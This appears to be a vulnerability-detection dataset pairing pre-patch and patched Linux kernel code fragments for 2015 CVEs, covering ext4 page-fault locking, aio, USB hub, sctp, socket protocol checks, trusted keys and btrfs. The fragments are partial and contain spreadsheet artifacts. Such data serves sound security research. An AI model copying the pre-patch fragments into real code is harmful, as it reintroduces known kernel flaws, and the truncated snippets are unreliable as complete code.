 file_update_time(vma->vm_file);

		handle = ext4_journal_start_sb(sb, EXT4_HT_WRITE_PAGE,
 EXT4_DATA_TRANS_BLOCKS(sb));
	}


 if (IS_ERR(handle))
		result = VM_FAULT_SIGBUS;
 if (write) {
 if (!IS_ERR(handle))
 ext4_journal_stop(handle);

 sb_end_pagefault(sb);
	}


 return result;
}
 if (write) {
 sb_start_pagefault(sb);
 file_update_time(vma->vm_file);

		handle = ext4_journal_start_sb(sb, EXT4_HT_WRITE_PAGE,
 ext4_chunk_trans_blocks(inode,
							PMD_SIZE / PAGE_SIZE));
	}


 if (IS_ERR(handle))
		result = VM_FAULT_SIGBUS;
 if (write) {
 if (!IS_ERR(handle))
 ext4_journal_stop(handle);

 sb_end_pagefault(sb);
	}


 return result;
}

static int ext4_dax_mkwrite(struct vm_area_struct *vma, struct vm_fault *vmf)
{
 return dax_mkwrite(vma, vmf, ext4_get_block_dax,
				ext4_end_io_unwritten);







































}

static const struct vm_operations_struct ext4_dax_vm_ops = {
	.fault		= ext4_dax_fault,
	.pmd_fault	= ext4_dax_pmd_fault,
	.page_mkwrite	= ext4_dax_mkwrite,
	.pfn_mkwrite	= dax_pfn_mkwrite,
};
#else
#define ext4_dax_vm_ops	ext4_file_vm_ops
#endif

static const struct vm_operations_struct ext4_file_vm_ops = {
	.fault		= filemap_fault,
	.map_pages	= filemap_map_pages,
	.page_mkwrite   = ext4_page_mkwrite,
};

	}










	first_block_offset = round_up(offset, sb->s_blocksize);
	last_block_offset = round_down((offset + length), sb->s_blocksize) - 1;

 truncate_pagecache_range(inode, first_block_offset,
					 last_block_offset);

 /* Wait all existing dio workers, newcomers will block on i_mutex */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);

 if (ext4_test_inode_flag(inode, EXT4_INODE_EXTENTS))
		credits = ext4_writepage_trans_blocks(inode);
 else
 if (IS_SYNC(inode))
 ext4_handle_sync(handle);

 /* Now release the pages again to reduce race window */
 if (last_block_offset > first_block_offset)
 truncate_pagecache_range(inode, first_block_offset,
					 last_block_offset);

	inode->i_mtime = inode->i_ctime = ext4_current_time(inode);
 ext4_mark_inode_dirty(handle, inode);
out_stop:
 ext4_journal_stop(handle);
out_dio:

 ext4_inode_resume_unlocked_dio(inode);
out_mutex:
 mutex_unlock(&inode->i_mutex);
			} else
 ext4_wait_for_tail_page_commit(inode);
		}

 /*
		 * Truncate pagecache after we've waited for commit
		 * in data=journal mode to make pages freeable.
 */
 truncate_pagecache(inode, inode->i_size);
 if (shrink)
 ext4_truncate(inode);

	}

 if (!rc) {

 sb_start_pagefault(inode->i_sb);
 file_update_time(vma->vm_file);


 /* Delalloc case is easy... */
 if (test_opt(inode->i_sb, DELALLOC) &&
	    !ext4_should_journal_data(inode) &&
out_ret:
	ret = block_page_mkwrite_return(ret);
out:

 sb_end_pagefault(inode->i_sb);
 return ret;
}












	INIT_LIST_HEAD(&ei->i_orphan);
	init_rwsem(&ei->xattr_sem);
	init_rwsem(&ei->i_data_sem);

	inode_init_once(&ei->vfs_inode);
}

 */
static inline void ext4_truncate_failed_write(struct inode *inode)
{

 truncate_inode_pages(inode->i_mapping, inode->i_size);
 ext4_truncate(inode);

}

/*
","	 * by other means, so we have i_data_sem.
 */
 struct rw_semaphore i_data_sem;
 /*
	 * i_mmap_sem is for serializing page faults with truncate / punch hole
	 * operations. We have to make sure that new page cannot be faulted in
	 * a section of the inode that is being punched. We cannot easily use
	 * i_data_sem for this since we need protection for the whole punch
	 * operation and i_data_sem ranks below transaction start so we have
	 * to occasionally drop it.
 */
 struct rw_semaphore i_mmap_sem;
 struct inode vfs_inode;
 struct jbd2_inode *jinode;

extern int ext4_zero_partial_blocks(handle_t *handle, struct inode *inode,
 loff_t lstart, loff_t lend);
extern int ext4_page_mkwrite(struct vm_area_struct *vma, struct vm_fault *vmf);
extern int ext4_filemap_fault(struct vm_area_struct *vma, struct vm_fault *vmf);
extern qsize_t *ext4_get_reserved_space(struct inode *inode);
extern void ext4_da_update_reserve_space(struct inode *inode,
 int used, int quota_claim);
 int partial_begin, partial_end;
 loff_t start, end;
 ext4_lblk_t lblk;

 unsigned int blkbits = inode->i_blkbits;

 trace_ext4_zero_range(inode, offset, len, mode);
 return ret;
	}












 /*
	 * Round up offset. This is not fallocate, we neet to zero out
	 * blocks, so convert interior block aligned part of the range to
		flags |= (EXT4_GET_BLOCKS_CONVERT_UNWRITTEN |
			  EXT4_EX_NOCACHE);





 /* Wait all existing dio workers, newcomers will block on i_mutex */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);

 /*
		 * Prevent page faults from reinstantiating pages we have
		 * released from page cache.
 */
 down_write(&EXT4_I(inode)->i_mmap_sem);
 /* Now release the pages and zero block aligned part of pages */
 truncate_pagecache_range(inode, start, end - 1);
		inode->i_mtime = inode->i_ctime = ext4_current_time(inode);

		ret = ext4_alloc_file_blocks(file, lblk, max_blocks, new_size,
					     flags, mode);
 up_write(&EXT4_I(inode)->i_mmap_sem);
 if (ret)
 goto out_dio;
	}
 goto out_mutex;
	}



 /* Wait for existing dio to complete */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);

 /*
	 * Prevent page faults from reinstantiating pages we have released from
	 * page cache.
 */
 down_write(&EXT4_I(inode)->i_mmap_sem);
 truncate_pagecache(inode, ioffset);

	credits = ext4_writepage_trans_blocks(inode);
	handle = ext4_journal_start(inode, EXT4_HT_TRUNCATE, credits);
 if (IS_ERR(handle)) {
		ret = PTR_ERR(handle);
 goto out_mmap;
	}

 down_write(&EXT4_I(inode)->i_data_sem);

out_stop:
 ext4_journal_stop(handle);
out_mmap:
 up_write(&EXT4_I(inode)->i_mmap_sem);
 ext4_inode_resume_unlocked_dio(inode);
out_mutex:
 mutex_unlock(&inode->i_mutex);
 goto out_mutex;
	}



 /* Wait for existing dio to complete */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);

 /*
	 * Prevent page faults from reinstantiating pages we have released from
	 * page cache.
 */
 down_write(&EXT4_I(inode)->i_mmap_sem);
 truncate_pagecache(inode, ioffset);

	credits = ext4_writepage_trans_blocks(inode);
	handle = ext4_journal_start(inode, EXT4_HT_TRUNCATE, credits);
 if (IS_ERR(handle)) {
		ret = PTR_ERR(handle);
 goto out_mmap;
	}

 /* Expand file to avoid data loss if there is error while shifting */

out_stop:
 ext4_journal_stop(handle);
out_mmap:
 up_write(&EXT4_I(inode)->i_mmap_sem);
 ext4_inode_resume_unlocked_dio(inode);
out_mutex:
 mutex_unlock(&inode->i_mutex);
{
 int result;
 handle_t *handle = NULL;
 struct inode *inode = file_inode(vma->vm_file);
 struct super_block *sb = inode->i_sb;
 bool write = vmf->flags & FAULT_FLAG_WRITE;

 if (write) {
 sb_start_pagefault(sb);
 file_update_time(vma->vm_file);
 down_read(&EXT4_I(inode)->i_mmap_sem);
		handle = ext4_journal_start_sb(sb, EXT4_HT_WRITE_PAGE,
 EXT4_DATA_TRANS_BLOCKS(sb));
	} else
 down_read(&EXT4_I(inode)->i_mmap_sem);

 if (IS_ERR(handle))
		result = VM_FAULT_SIGBUS;
 if (write) {
 if (!IS_ERR(handle))
 ext4_journal_stop(handle);
 up_read(&EXT4_I(inode)->i_mmap_sem);
 sb_end_pagefault(sb);
	} else
 up_read(&EXT4_I(inode)->i_mmap_sem);

 return result;
}
 if (write) {
 sb_start_pagefault(sb);
 file_update_time(vma->vm_file);
 down_read(&EXT4_I(inode)->i_mmap_sem);
		handle = ext4_journal_start_sb(sb, EXT4_HT_WRITE_PAGE,
 ext4_chunk_trans_blocks(inode,
							PMD_SIZE / PAGE_SIZE));
	} else
 down_read(&EXT4_I(inode)->i_mmap_sem);

 if (IS_ERR(handle))
		result = VM_FAULT_SIGBUS;
 if (write) {
 if (!IS_ERR(handle))
 ext4_journal_stop(handle);
 up_read(&EXT4_I(inode)->i_mmap_sem);
 sb_end_pagefault(sb);
	} else
 up_read(&EXT4_I(inode)->i_mmap_sem);

 return result;
}

static int ext4_dax_mkwrite(struct vm_area_struct *vma, struct vm_fault *vmf)
{
 int err;
 struct inode *inode = file_inode(vma->vm_file);

 sb_start_pagefault(inode->i_sb);
 file_update_time(vma->vm_file);
 down_read(&EXT4_I(inode)->i_mmap_sem);
	err = __dax_mkwrite(vma, vmf, ext4_get_block_dax,
			    ext4_end_io_unwritten);
 up_read(&EXT4_I(inode)->i_mmap_sem);
 sb_end_pagefault(inode->i_sb);

 return err;
}

/*
 * Handle write fault for VM_MIXEDMAP mappings. Similarly to ext4_dax_mkwrite()
 * handler we check for races agaist truncate. Note that since we cycle through
 * i_mmap_sem, we are sure that also any hole punching that began before we
 * were called is finished by now and so if it included part of the file we
 * are working on, our pte will get unmapped and the check for pte_same() in
 * wp_pfn_shared() fails. Thus fault gets retried and things work out as
 * desired.
 */
static int ext4_dax_pfn_mkwrite(struct vm_area_struct *vma,
 struct vm_fault *vmf)
{
 struct inode *inode = file_inode(vma->vm_file);
 struct super_block *sb = inode->i_sb;
 int ret = VM_FAULT_NOPAGE;
 loff_t size;

 sb_start_pagefault(sb);
 file_update_time(vma->vm_file);
 down_read(&EXT4_I(inode)->i_mmap_sem);
	size = (i_size_read(inode) + PAGE_SIZE - 1) >> PAGE_SHIFT;
 if (vmf->pgoff >= size)
		ret = VM_FAULT_SIGBUS;
 up_read(&EXT4_I(inode)->i_mmap_sem);
 sb_end_pagefault(sb);

 return ret;
}

static const struct vm_operations_struct ext4_dax_vm_ops = {
	.fault		= ext4_dax_fault,
	.pmd_fault	= ext4_dax_pmd_fault,
	.page_mkwrite	= ext4_dax_mkwrite,
	.pfn_mkwrite	= ext4_dax_pfn_mkwrite,
};
#else
#define ext4_dax_vm_ops	ext4_file_vm_ops
#endif

static const struct vm_operations_struct ext4_file_vm_ops = {
	.fault		= ext4_filemap_fault,
	.map_pages	= filemap_map_pages,
	.page_mkwrite   = ext4_page_mkwrite,
};

	}

 /* Wait all existing dio workers, newcomers will block on i_mutex */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);

 /*
	 * Prevent page faults from reinstantiating pages we have released from
	 * page cache.
 */
 down_write(&EXT4_I(inode)->i_mmap_sem);
	first_block_offset = round_up(offset, sb->s_blocksize);
	last_block_offset = round_down((offset + length), sb->s_blocksize) - 1;

 truncate_pagecache_range(inode, first_block_offset,
					 last_block_offset);





 if (ext4_test_inode_flag(inode, EXT4_INODE_EXTENTS))
		credits = ext4_writepage_trans_blocks(inode);
 else
 if (IS_SYNC(inode))
 ext4_handle_sync(handle);






	inode->i_mtime = inode->i_ctime = ext4_current_time(inode);
 ext4_mark_inode_dirty(handle, inode);
out_stop:
 ext4_journal_stop(handle);
out_dio:
 up_write(&EXT4_I(inode)->i_mmap_sem);
 ext4_inode_resume_unlocked_dio(inode);
out_mutex:
 mutex_unlock(&inode->i_mutex);
			} else
 ext4_wait_for_tail_page_commit(inode);
		}
 down_write(&EXT4_I(inode)->i_mmap_sem);
 /*
		 * Truncate pagecache after we've waited for commit
		 * in data=journal mode to make pages freeable.
 */
 truncate_pagecache(inode, inode->i_size);
 if (shrink)
 ext4_truncate(inode);
 up_write(&EXT4_I(inode)->i_mmap_sem);
	}

 if (!rc) {

 sb_start_pagefault(inode->i_sb);
 file_update_time(vma->vm_file);

 down_read(&EXT4_I(inode)->i_mmap_sem);
 /* Delalloc case is easy... */
 if (test_opt(inode->i_sb, DELALLOC) &&
	    !ext4_should_journal_data(inode) &&
out_ret:
	ret = block_page_mkwrite_return(ret);
out:
 up_read(&EXT4_I(inode)->i_mmap_sem);
 sb_end_pagefault(inode->i_sb);
 return ret;
}

int ext4_filemap_fault(struct vm_area_struct *vma, struct vm_fault *vmf)
{
 struct inode *inode = file_inode(vma->vm_file);
 int err;

 down_read(&EXT4_I(inode)->i_mmap_sem);
	err = filemap_fault(vma, vmf);
 up_read(&EXT4_I(inode)->i_mmap_sem);

 return err;
}
	INIT_LIST_HEAD(&ei->i_orphan);
	init_rwsem(&ei->xattr_sem);
	init_rwsem(&ei->i_data_sem);
	init_rwsem(&ei->i_mmap_sem);
	inode_init_once(&ei->vfs_inode);
}

 */
static inline void ext4_truncate_failed_write(struct inode *inode)
{
 down_write(&EXT4_I(inode)->i_mmap_sem);
 truncate_inode_pages(inode->i_mapping, inode->i_size);
 ext4_truncate(inode);
 up_write(&EXT4_I(inode)->i_mmap_sem);
}

/*
"
2016,DoS Overflow ,CVE-2015-8830," unsigned long *nr_segs,
 size_t *len,
 struct iovec **iovec,
 bool compat)

{
 ssize_t ret;


 /* len now reflect bytes instead of segs */
	*len = ret;

 return 0;
}

static ssize_t aio_setup_single_vector(struct kiocb *kiocb,
 int rw, char __user *buf,
 unsigned long *nr_segs,
 size_t len,
 struct iovec *iovec)

{


 if (unlikely(!access_ok(!rw, buf, len)))
 return -EFAULT;

 iovec->iov_base = buf;
 iovec->iov_len = len;
	*nr_segs = 1;

 return 0;
}


 if (opcode == IOCB_CMD_PREADV || opcode == IOCB_CMD_PWRITEV)
			ret = aio_setup_vectored_rw(req, rw, buf, &nr_segs,
						&len, &iovec, compat);
 else
			ret = aio_setup_single_vector(req, rw, buf, &nr_segs,
						  len, iovec);
 if (!ret)
			ret = rw_verify_area(rw, file, &req->ki_pos, len);
 if (ret < 0) {
 file_start_write(file);

 if (iter_op) {
 iov_iter_init(&iter, rw, iovec, nr_segs, len);
			ret = iter_op(req, &iter);
		} else {
			ret = rw_op(req, iovec, nr_segs, req->ki_pos);
		}

 if (rw == WRITE)
"," unsigned long *nr_segs,
 size_t *len,
 struct iovec **iovec,
 bool compat,
 struct iov_iter *iter)
{
 ssize_t ret;


 /* len now reflect bytes instead of segs */
	*len = ret;
 iov_iter_init(iter, rw, *iovec, *nr_segs, *len);
 return 0;
}

static ssize_t aio_setup_single_vector(struct kiocb *kiocb,
 int rw, char __user *buf,
 unsigned long *nr_segs,
 size_t len,
 struct iovec *iovec,
 struct iov_iter *iter)
{
 if (len > MAX_RW_COUNT)
		len = MAX_RW_COUNT;
 if (unlikely(!access_ok(!rw, buf, len)))
 return -EFAULT;

 iovec->iov_base = buf;
 iovec->iov_len = len;
	*nr_segs = 1;
 iov_iter_init(iter, rw, iovec, *nr_segs, len);
 return 0;
}


 if (opcode == IOCB_CMD_PREADV || opcode == IOCB_CMD_PWRITEV)
			ret = aio_setup_vectored_rw(req, rw, buf, &nr_segs,
						&len, &iovec, compat, &iter);
 else
			ret = aio_setup_single_vector(req, rw, buf, &nr_segs,
						  len, iovec, &iter);
 if (!ret)
			ret = rw_verify_area(rw, file, &req->ki_pos, len);
 if (ret < 0) {
 file_start_write(file);

 if (iter_op) {

			ret = iter_op(req, &iter);
		} else {
			ret = rw_op(req, iter.iov, iter.nr_segs, req->ki_pos);
		}

 if (rw == WRITE)
"
2016,DoS ,CVE-2015-8816," unsigned delay;

 /* Continue a partial initialization */
 if (type == HUB_INIT2)
 goto init2;
 if (type == HUB_INIT3)








 goto init3;



 /* The superspeed hub except for root hub has to use Hub Depth
	 * value as an offset into the route string to locate the bits
 queue_delayed_work(system_power_efficient_wq,
					&hub->init_work,
 msecs_to_jiffies(delay));

 return;		/* Continues at init3: below */
		} else {
 msleep(delay);
 /* Allow autosuspend if it was suppressed */
 if (type <= HUB_INIT3)
 usb_autopm_put_interface_async(to_usb_interface(hub->intfdev));





}

/* Implement the continuations for the delays above */
"," unsigned delay;

 /* Continue a partial initialization */
 if (type == HUB_INIT2 || type == HUB_INIT3) {
 device_lock(hub->intfdev);

 /* Was the hub disconnected while we were waiting? */
 if (hub->disconnected) {
 device_unlock(hub->intfdev);
 kref_put(&hub->kref, hub_release);
 return;
		}
 if (type == HUB_INIT2)
 goto init2;
 goto init3;
	}
 kref_get(&hub->kref);

 /* The superspeed hub except for root hub has to use Hub Depth
	 * value as an offset into the route string to locate the bits
 queue_delayed_work(system_power_efficient_wq,
					&hub->init_work,
 msecs_to_jiffies(delay));
 device_unlock(hub->intfdev);
 return;		/* Continues at init3: below */
		} else {
 msleep(delay);
 /* Allow autosuspend if it was suppressed */
 if (type <= HUB_INIT3)
 usb_autopm_put_interface_async(to_usb_interface(hub->intfdev));

 if (type == HUB_INIT2 || type == HUB_INIT3)
 device_unlock(hub->intfdev);

 kref_put(&hub->kref, hub_release);
}

/* Implement the continuations for the delays above */
"
2016,DoS Exec Code ,CVE-2015-8812,"	error = l2t_send(tdev, skb, l2e);
 if (error < 0)
 kfree_skb(skb);
 return error;
}

int iwch_cxgb3_ofld_send(struct t3cdev *tdev, struct sk_buff *skb)
	error = cxgb3_ofld_send(tdev, skb);
 if (error < 0)
 kfree_skb(skb);
 return error;
}

static void release_tid(struct t3cdev *tdev, u32 hwtid, struct sk_buff *skb)
","	error = l2t_send(tdev, skb, l2e);
 if (error < 0)
 kfree_skb(skb);
 return error < 0 ? error : 0;
}

int iwch_cxgb3_ofld_send(struct t3cdev *tdev, struct sk_buff *skb)
	error = cxgb3_ofld_send(tdev, skb);
 if (error < 0)
 kfree_skb(skb);
 return error < 0 ? error : 0;
}

static void release_tid(struct t3cdev *tdev, u32 hwtid, struct sk_buff *skb)
"
2016,DoS ,CVE-2015-8787,"
 rcu_read_lock();
		indev = __in_dev_get_rcu(skb->dev);
 if (indev != NULL) {
			ifa = indev->ifa_list;
			newdst = ifa->ifa_local;
		}
","
 rcu_read_lock();
		indev = __in_dev_get_rcu(skb->dev);
 if (indev && indev->ifa_list) {
			ifa = indev->ifa_list;
			newdst = ifa->ifa_local;
		}
"
2016,DoS ,CVE-2015-8785,"		tmp = iov_iter_copy_from_user_atomic(page, ii, offset, bytes);
 flush_dcache_page(page);


 if (!tmp) {
 unlock_page(page);
 page_cache_release(page);
		req->page_descs[req->num_pages].length = tmp;
		req->num_pages++;

 iov_iter_advance(ii, tmp);
		count += tmp;
		pos += tmp;
		offset += tmp;
","		tmp = iov_iter_copy_from_user_atomic(page, ii, offset, bytes);
 flush_dcache_page(page);

 iov_iter_advance(ii, tmp);
 if (!tmp) {
 unlock_page(page);
 page_cache_release(page);
		req->page_descs[req->num_pages].length = tmp;
		req->num_pages++;


		count += tmp;
		pos += tmp;
		offset += tmp;
"
2016,DoS ,CVE-2015-8767," int error;
 struct sctp_transport *transport = (struct sctp_transport *) peer;
 struct sctp_association *asoc = transport->asoc;
 struct net *net = sock_net(asoc->base.sk);


 /* Check whether a task is in the sock.  */

 bh_lock_sock(asoc->base.sk);
 if (sock_owned_by_user(asoc->base.sk)) {
 pr_debug(""%s: sock is busy\n"", __func__);

 /* Try again later.  */
			   transport, GFP_ATOMIC);

 if (error)
 asoc->base.sk->sk_err = -error;

out_unlock:
 bh_unlock_sock(asoc->base.sk);
 sctp_transport_put(transport);
}

static void sctp_generate_timeout_event(struct sctp_association *asoc,
 sctp_event_timeout_t timeout_type)
{
 struct net *net = sock_net(asoc->base.sk);

 int error = 0;

 bh_lock_sock(asoc->base.sk);
 if (sock_owned_by_user(asoc->base.sk)) {
 pr_debug(""%s: sock is busy: timer %d\n"", __func__,
			 timeout_type);

			   (void *)timeout_type, GFP_ATOMIC);

 if (error)
 asoc->base.sk->sk_err = -error;

out_unlock:
 bh_unlock_sock(asoc->base.sk);
 sctp_association_put(asoc);
}

 int error = 0;
 struct sctp_transport *transport = (struct sctp_transport *) data;
 struct sctp_association *asoc = transport->asoc;
 struct net *net = sock_net(asoc->base.sk);


 bh_lock_sock(asoc->base.sk);
 if (sock_owned_by_user(asoc->base.sk)) {
 pr_debug(""%s: sock is busy\n"", __func__);

 /* Try again later.  */
			   transport, GFP_ATOMIC);

 if (error)
 asoc->base.sk->sk_err = -error;

out_unlock:
 bh_unlock_sock(asoc->base.sk);
 sctp_transport_put(transport);
}

{
 struct sctp_transport *transport = (struct sctp_transport *) data;
 struct sctp_association *asoc = transport->asoc;
 struct net *net = sock_net(asoc->base.sk);


 bh_lock_sock(asoc->base.sk);
 if (sock_owned_by_user(asoc->base.sk)) {
 pr_debug(""%s: sock is busy\n"", __func__);

 /* Try again later.  */
		   asoc->state, asoc->ep, asoc, transport, GFP_ATOMIC);

out_unlock:
 bh_unlock_sock(asoc->base.sk);
 sctp_association_put(asoc);
}

"," int error;
 struct sctp_transport *transport = (struct sctp_transport *) peer;
 struct sctp_association *asoc = transport->asoc;
 struct sock *sk = asoc->base.sk;
 struct net *net = sock_net(sk);

 /* Check whether a task is in the sock.  */

 bh_lock_sock(sk);
 if (sock_owned_by_user(sk)) {
 pr_debug(""%s: sock is busy\n"", __func__);

 /* Try again later.  */
			   transport, GFP_ATOMIC);

 if (error)
		sk->sk_err = -error;

out_unlock:
 bh_unlock_sock(sk);
 sctp_transport_put(transport);
}

static void sctp_generate_timeout_event(struct sctp_association *asoc,
 sctp_event_timeout_t timeout_type)
{
 struct sock *sk = asoc->base.sk;
 struct net *net = sock_net(sk);
 int error = 0;

 bh_lock_sock(sk);
 if (sock_owned_by_user(sk)) {
 pr_debug(""%s: sock is busy: timer %d\n"", __func__,
			 timeout_type);

			   (void *)timeout_type, GFP_ATOMIC);

 if (error)
		sk->sk_err = -error;

out_unlock:
 bh_unlock_sock(sk);
 sctp_association_put(asoc);
}

 int error = 0;
 struct sctp_transport *transport = (struct sctp_transport *) data;
 struct sctp_association *asoc = transport->asoc;
 struct sock *sk = asoc->base.sk;
 struct net *net = sock_net(sk);

 bh_lock_sock(sk);
 if (sock_owned_by_user(sk)) {
 pr_debug(""%s: sock is busy\n"", __func__);

 /* Try again later.  */
			   transport, GFP_ATOMIC);

 if (error)
		sk->sk_err = -error;

out_unlock:
 bh_unlock_sock(sk);
 sctp_transport_put(transport);
}

{
 struct sctp_transport *transport = (struct sctp_transport *) data;
 struct sctp_association *asoc = transport->asoc;
 struct sock *sk = asoc->base.sk;
 struct net *net = sock_net(sk);

 bh_lock_sock(sk);
 if (sock_owned_by_user(sk)) {
 pr_debug(""%s: sock is busy\n"", __func__);

 /* Try again later.  */
		   asoc->state, asoc->ep, asoc, transport, GFP_ATOMIC);

out_unlock:
 bh_unlock_sock(sk);
 sctp_association_put(asoc);
}

"
2016,DoS ,CVE-2015-8746,"	.reboot_recovery_ops = &nfs41_reboot_recovery_ops,
	.nograce_recovery_ops = &nfs41_nograce_recovery_ops,
	.state_renewal_ops = &nfs41_state_renewal_ops,

};
#endif

","	.reboot_recovery_ops = &nfs41_reboot_recovery_ops,
	.nograce_recovery_ops = &nfs41_nograce_recovery_ops,
	.state_renewal_ops = &nfs41_state_renewal_ops,
	.mig_recovery_ops = &nfs41_mig_recovery_ops,
};
#endif

"
2016,#NAME?,CVE-2015-8709,,
2015,Bypass ,CVE-2015-8660," if (err)
 goto out;

	upperdentry = ovl_dentry_upper(dentry);
 if (upperdentry) {


 mutex_lock(&upperdentry->d_inode->i_mutex);
		err = notify_change(upperdentry, attr, NULL);
 mutex_unlock(&upperdentry->d_inode->i_mutex);
	} else {
		err = ovl_copy_up_last(dentry, attr, false);
	}
 ovl_drop_write(dentry);
out:
"," if (err)
 goto out;

	err = ovl_copy_up(dentry);
 if (!err) {
		upperdentry = ovl_dentry_upper(dentry);

 mutex_lock(&upperdentry->d_inode->i_mutex);
		err = notify_change(upperdentry, attr, NULL);
 mutex_unlock(&upperdentry->d_inode->i_mutex);


	}
 ovl_drop_write(dentry);
out:
"
2016,Bypass +Info ,CVE-2015-8575," if (!addr || addr->sa_family != AF_BLUETOOTH)
 return -EINVAL;




 lock_sock(sk);

 if (sk->sk_state != BT_OPEN) {
"," if (!addr || addr->sa_family != AF_BLUETOOTH)
 return -EINVAL;

 if (addr_len < sizeof(struct sockaddr_sco))
 return -EINVAL;

 lock_sock(sk);

 if (sk->sk_state != BT_OPEN) {
"
2015,Bypass +Info ,CVE-2015-8569," struct pptp_opt *opt = &po->proto.pptp;
 int error = 0;




 lock_sock(sk);

	opt->src_addr = sp->sa_addr.pptp;
 struct flowi4 fl4;
 int error = 0;




 if (sp->sa_protocol != PX_PROTO_PPTP)
 return -EINVAL;

"," struct pptp_opt *opt = &po->proto.pptp;
 int error = 0;

 if (sockaddr_len < sizeof(struct sockaddr_pppox))
 return -EINVAL;

 lock_sock(sk);

	opt->src_addr = sp->sa_addr.pptp;
 struct flowi4 fl4;
 int error = 0;

 if (sockaddr_len < sizeof(struct sockaddr_pppox))
 return -EINVAL;

 if (sp->sa_protocol != PX_PROTO_PPTP)
 return -EINVAL;

"
2016,DoS ,CVE-2015-8551,,
2015,DoS +Priv ,CVE-2015-8543,"				sk_no_check_rx : 1,
				sk_userlocks : 4,
				sk_protocol  : 8,

				sk_type      : 16;
 kmemcheck_bitfield_end(flags);
 int			sk_wmem_queued;
 struct sock *sk;
	ax25_cb *ax25;




 if (!net_eq(net, &init_net))
 return -EAFNOSUPPORT;

{
 struct sock *sk;




 if (!net_eq(net, &init_net))
 return -EAFNOSUPPORT;

 int try_loading_module = 0;
 int err;




	sock->state = SS_UNCONNECTED;

 /* Look for the requested type/protocol pair. */
 int try_loading_module = 0;
 int err;




 /* Look for the requested type/protocol pair. */
lookup_protocol:
	err = -ESOCKTNOSUPPORT;
 struct sock *sk;
 struct irda_sock *self;




 if (net != &init_net)
 return -EAFNOSUPPORT;

","				sk_no_check_rx : 1,
				sk_userlocks : 4,
				sk_protocol  : 8,
#define SK_PROTOCOL_MAX U8_MAX
				sk_type      : 16;
 kmemcheck_bitfield_end(flags);
 int			sk_wmem_queued;
 struct sock *sk;
	ax25_cb *ax25;

 if (protocol < 0 || protocol > SK_PROTOCOL_MAX)
 return -EINVAL;

 if (!net_eq(net, &init_net))
 return -EAFNOSUPPORT;

{
 struct sock *sk;

 if (protocol < 0 || protocol > SK_PROTOCOL_MAX)
 return -EINVAL;

 if (!net_eq(net, &init_net))
 return -EAFNOSUPPORT;

 int try_loading_module = 0;
 int err;

 if (protocol < 0 || protocol >= IPPROTO_MAX)
 return -EINVAL;

	sock->state = SS_UNCONNECTED;

 /* Look for the requested type/protocol pair. */
 int try_loading_module = 0;
 int err;

 if (protocol < 0 || protocol >= IPPROTO_MAX)
 return -EINVAL;

 /* Look for the requested type/protocol pair. */
lookup_protocol:
	err = -ESOCKTNOSUPPORT;
 struct sock *sk;
 struct irda_sock *self;

 if (protocol < 0 || protocol > SK_PROTOCOL_MAX)
 return -EINVAL;

 if (net != &init_net)
 return -EAFNOSUPPORT;

"
2016,DoS +Priv ,CVE-2015-8539," size_t datalen = prep->datalen;
 int ret = 0;



 if (datalen <= 0 || datalen > 32767 || !prep->data)
 return -EINVAL;

 */
static int trusted_update(struct key *key, struct key_preparsed_payload *prep)
{
 struct trusted_key_payload *p = key->payload.data[0];
 struct trusted_key_payload *new_p;
 struct trusted_key_options *new_o;
 size_t datalen = prep->datalen;
 char *datablob;
 int ret = 0;




 if (!p->migratable)
 return -EPERM;
 if (datalen <= 0 || datalen > 32767 || !prep->data)

 if (ret == 0) {
 /* attach the new data, displacing the old */
		zap = key->payload.data[0];



 rcu_assign_keypointer(key, upayload);
		key->expiry = 0;
	}
"," size_t datalen = prep->datalen;
 int ret = 0;

 if (test_bit(KEY_FLAG_NEGATIVE, &key->flags))
 return -ENOKEY;
 if (datalen <= 0 || datalen > 32767 || !prep->data)
 return -EINVAL;

 */
static int trusted_update(struct key *key, struct key_preparsed_payload *prep)
{
 struct trusted_key_payload *p;
 struct trusted_key_payload *new_p;
 struct trusted_key_options *new_o;
 size_t datalen = prep->datalen;
 char *datablob;
 int ret = 0;

 if (test_bit(KEY_FLAG_NEGATIVE, &key->flags))
 return -ENOKEY;
	p = key->payload.data[0];
 if (!p->migratable)
 return -EPERM;
 if (datalen <= 0 || datalen > 32767 || !prep->data)

 if (ret == 0) {
 /* attach the new data, displacing the old */
 if (!test_bit(KEY_FLAG_NEGATIVE, &key->flags))
			zap = key->payload.data[0];
 else
			zap = NULL;
 rcu_assign_keypointer(key, upayload);
		key->expiry = 0;
	}
"
2015,#NAME?,CVE-2015-8374,"
}










































/*
 * this can truncate away extent items, csum items and directory items.
 * It starts at a high offset and removes keys until it can't find
			 * special encodings
 */
 if (!del_item &&
 btrfs_file_extent_compression(leaf, fi) == 0 &&
 btrfs_file_extent_encryption(leaf, fi) == 0 &&
 btrfs_file_extent_other_encoding(leaf, fi) == 0) {
				u32 size = new_size - found_key.offset;

 if (test_bit(BTRFS_ROOT_REF_COWS, &root->state))
 inode_sub_bytes(inode, item_end + 1 -
							new_size);

 /*
				 * update the ram bytes to properly reflect
				 * the new size of our item

 */
 btrfs_set_file_extent_ram_bytes(leaf, fi, size);
				size =
 btrfs_file_extent_calc_inline_size(size);
 btrfs_truncate_item(root, path, size, 1);



















			} else if (test_bit(BTRFS_ROOT_REF_COWS,
					    &root->state)) {
 inode_sub_bytes(inode, item_end + 1 -
						found_key.offset);
			}
		}
delete:
","
}

static int truncate_inline_extent(struct inode *inode,
 struct btrfs_path *path,
 struct btrfs_key *found_key,
 const u64 item_end,
 const u64 new_size)
{
 struct extent_buffer *leaf = path->nodes[0];
 int slot = path->slots[0];
 struct btrfs_file_extent_item *fi;
	u32 size = (u32)(new_size - found_key->offset);
 struct btrfs_root *root = BTRFS_I(inode)->root;

	fi = btrfs_item_ptr(leaf, slot, struct btrfs_file_extent_item);

 if (btrfs_file_extent_compression(leaf, fi) != BTRFS_COMPRESS_NONE) {
 loff_t offset = new_size;
 loff_t page_end = ALIGN(offset, PAGE_CACHE_SIZE);

 /*
		 * Zero out the remaining of the last page of our inline extent,
		 * instead of directly truncating our inline extent here - that
		 * would be much more complex (decompressing all the data, then
		 * compressing the truncated data, which might be bigger than
		 * the size of the inline extent, resize the extent, etc).
		 * We release the path because to get the page we might need to
		 * read the extent item from disk (data not in the page cache).
 */
 btrfs_release_path(path);
